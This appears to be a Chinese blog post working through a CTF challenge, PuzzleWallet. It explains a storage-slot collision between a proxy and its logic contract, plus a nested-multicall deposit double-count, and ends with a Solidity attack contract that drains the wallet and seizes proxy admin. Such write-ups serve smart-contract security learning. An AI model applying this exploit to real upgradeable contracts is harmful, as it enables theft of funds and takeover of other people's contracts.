---
title: 'proxy-1'
date: 2022-12-20 14:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'

---

<!-- more -->

#### 第二十四关  PuzzleWallet 思路与POC

#### 目标: 几个精明的程序员构建了一个只有管理员可更新逻辑的钱包合约,劫持此钱包并成为代理合约的管理员

##### 先看代码:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";
//puzzle代理合约
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }
 //申请成为管理员函数,无任何限制
    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}
//puzzle逻辑实现合约
contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    
    mapping(address => bool) public whitelisted; //白名单map
    mapping(address => uint256) public balances;//地址->余额map
    
//初始化钱包,要求maxBalance变量为0
    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }
    //白名单限制  
    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }
   //设置钱包最大余额msg.sender必须在白名单上
    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }
 //只有owner能新增白名单地址
    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }
//只有白名单上的用户才能往钱包里冲钱
    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }
//用户余额转出 没有重入漏洞
    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted    {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }
//同时调用多个逻辑合约的函数,但是deposit函数只允许被调用一次
    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        //循环取出函数选择器
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
              //注意一点 require判断是表达式结果为false的时候触发
               require(!depositCalled, "Deposit can only be called once");
              // 防止用户重复存入token
               depositCalled = true;
            }
       //call函数没防止回调,应该if(selector == this.multicall.selector){revert}
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
/*
发现问题了嘛(逻辑漏洞):合约创建者似乎忘记了代理合约与逻辑实现合约的存储槽是共享的
address public pendingAdmin; slot0 <-   address public owner; slot0
address public admin;  slot1 <-   uint256 public maxBalance; slot1

poc思路:
代理合约上的pendingAdmin变量可以没有任何限制的修改,但是它对应的是逻辑合约的owner(禁止修改)
替换了owner变量之后我们就劫持了wallet合约!!
之后仅需要修改 maxBalance变量即可对于修改代理合约的admin(flag)

*/
```

#####  所以我们得出以下流程:
##### 1.PuzzleProxy.proposeNewAdmin() -> PuzzleWallet.addToWhitelist(you address)

##### 执行完1之后:

##### 此时我们成功劫持了逻辑合约,接下来就是想办法将合约的余额全部提现,然后才能调用setMaxBalance修改admin 

##### 那么如何将合约的余额全部提现呢,当前合约余额是0.001ETH.我们此时成为了白名单用户余额是0.

##### 问题关键在于需要我们的余额大于合约余额或者保持跟合约余额保持一致,如何做到看multicall函数.

##### 此时multicall函数允许我们调用deposit函数一次, 合约余额:0.002ETH user:0.001ETH.

##### 那么如果我们构建calldata:

##### {

##### 使其先调用deposit一次{0.001ETH} 

##### 然后回调multicall从而刷新depositCalled值,然后再调用deposit呢?{两次调用用户余额0.002ETH}

##### }

##### 由于以上括起来的操作都是在一次交易中完成的,所以实际上我们仅发送了0.001ETH到合约

##### 所以就得到了 合约余额:0.002ETH user:0.003ETH.

2. ##### PuzzleWallet.execute(you address ,合约所有余额) -> PuzzleWallet.setMaxBalance(uint256(you address))

  ##### 完成 :ok_hand:

#### 最终POC:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Vulnerability/PuzzleWallet.sol";

contract hackWallet {
    PuzzleProxy public px = PuzzleProxy(payable(0x12E9E06d6AaA6941a0dd49C6D21F01D6c0f0CbeA));

    PuzzleWallet public wallet = PuzzleWallet(payable(0x12E9E06d6AaA6941a0dd49C6D21F01D6c0f0CbeA));

    function attack() public {
        //构造calldata
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);

        //替换wallet合约中的owner
        px.proposeNewAdmin(msg.sender);
        wallet.addToWhitelist(msg.sender);

        //构造calldata使用户余额大于合约余额
        wallet.multicall{value: 0.001 ether}(nestedMulticall);
        //提现合约所有余额并且改变solt1 ,也就是改变proxy合约中的admin
        wallet.execute(msg.sender, 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}

```

